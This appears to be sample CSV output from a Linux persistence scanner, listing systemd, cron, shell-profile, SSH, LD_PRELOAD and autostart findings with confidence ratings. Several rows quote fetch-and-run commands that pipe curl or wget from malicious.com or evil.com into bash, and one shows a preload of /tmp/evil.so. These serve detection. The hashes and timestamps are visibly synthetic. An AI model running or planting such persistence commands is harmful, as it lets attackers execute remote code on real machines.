timestamp,category,subcategory,persistence_type,location,description,confidence,sha256,metadata,additional_info
2026-01-23T10:30:15Z,Systemd,Service,systemd_service,/etc/systemd/system/suspicious-updater.service,"Service: suspicious-updater.service | Status: enabled | ExecStart: /bin/bash -c 'curl http://malicious.com/payload | bash'",HIGH,d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5,mode:644|owner:root:root|size:245|modified:1674472815|accessed:1674472815|changed:1674472815,enabled=enabled
2026-01-23T10:30:18Z,Cron,System,cron_script,/etc/cron.d/backup,"Scheduled script: backup",MEDIUM,a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2,mode:644|owner:root:root|size:156|modified:1674382900|accessed:1674472800|changed:1674382900,content_preview=#!/bin/bash
2026-01-23T10:30:22Z,Cron,User,user_crontab,/var/spool/cron/crontabs/ubuntu,User ubuntu crontab entries,HIGH,b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6b7c8d9e0f1a2b3c4,user=ubuntu,preview=*/5 * * * * wget -O /tmp/update.sh http://evil.com/update && chmod +x /tmp/update.sh && /tmp/update.sh
2026-01-23T10:30:25Z,ShellProfile,System,profile_file,/etc/profile,System shell profile,LOW,c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6,mode:644|owner:root:root|size:575|modified:1673456780|accessed:1674472825|changed:1673456780,suspicious_lines=0
2026-01-23T10:30:28Z,ShellProfile,User,user_profile,/home/ubuntu/.bashrc,User profile for ubuntu,HIGH,e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8,mode:644|owner:ubuntu:ubuntu|size:3771|modified:1674456000|accessed:1674472828|changed:1674456000,user=ubuntu
2026-01-23T10:30:31Z,SSH,AuthorizedKeys,ssh_authorized_keys,/home/ubuntu/.ssh/authorized_keys,User ubuntu has 3 SSH authorized keys,MEDIUM,f9a0b1c2d3e4f5a6b7c8d9e0f1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0,mode:600|owner:ubuntu:ubuntu|size:1234|modified:1674400000|accessed:1674472831|changed:1674400000,user=ubuntu|keys=3
2026-01-23T10:30:34Z,SSH,SystemConfig,sshd_config,/etc/ssh/sshd_config,SSH daemon configuration,MEDIUM,a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2,mode:644|owner:root:root|size:3289|modified:1673456780|accessed:1674472834|changed:1673456780,
2026-01-23T10:30:37Z,Init,Script,init_script,/etc/rc.local,Init script: rc.local,HIGH,b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6b7c8d9e0f1a2b3c4,mode:755|owner:root:root|size:412|modified:1674455000|accessed:1674472837|changed:1674455000,
2026-01-23T10:30:40Z,Preload,LDPreload,ld_preload,/etc/ld.so.preload,LD_PRELOAD config with content,HIGH,c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6,mode:644|owner:root:root|size:28|modified:1674460000|accessed:1674472840|changed:1674460000,content=/tmp/evil.so
2026-01-23T10:30:43Z,Kernel,Module,kernel_module,/lib/modules/5.15.0-56-generic/kernel/net/netfilter/nf_tables.ko,Loaded module: nf_tables (size: 262144 used: 2),LOW,d7e8f9a0b1c2d3e4f5a6b7c8d9e0f1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8,mode:644|owner:root:root|size:262144|modified:1673456780|accessed:1674472843|changed:1673456780,module=nf_tables
2026-01-23T10:30:46Z,Autostart,XDG,xdg_autostart,/home/ubuntu/.config/autostart/updater.desktop,"XDG autostart: updater.desktop | Exec: bash -c 'curl http://malicious.com/update | bash'",HIGH,e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0,mode:644|owner:ubuntu:ubuntu|size:189|modified:1674461000|accessed:1674472846|changed:1674461000,
2026-01-23T10:30:49Z,Environment,System,environment_file,/etc/environment,System environment file,LOW,f1a2b3c4d5e6e7f8a9b0c1d2e3f4f5a6b7c8d9e0f1a2b3c4d5e6e7f8a9b0c1d2,mode:644|owner:root:root|size:117|modified:1673456780|accessed:1674472849|changed:1673456780,
2026-01-23T10:30:52Z,Privilege,Sudoers,sudoers_file,/etc/sudoers,Sudoers configuration,LOW,a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4,mode:440|owner:root:root|size:1680|modified:1673456780|accessed:1674472852|changed:1673456780,
2026-01-23T10:30:55Z,PAM,Config,pam_config,/etc/pam.d/common-auth,PAM config: common-auth,LOW,b5c6d7e8f9a0b1c2d3e4f5a6b7c8d9e0f1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6,mode:644|owner:root:root|size:1231|modified:1673456780|accessed:1674472855|changed:1673456780,
2026-01-23T10:30:58Z,MOTD,Script,motd_script,/etc/update-motd.d/50-landscape-sysinfo,MOTD script: 50-landscape-sysinfo,LOW,c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8,mode:755|owner:root:root|size:4564|modified:1673456780|accessed:1674472858|changed:1673456780,
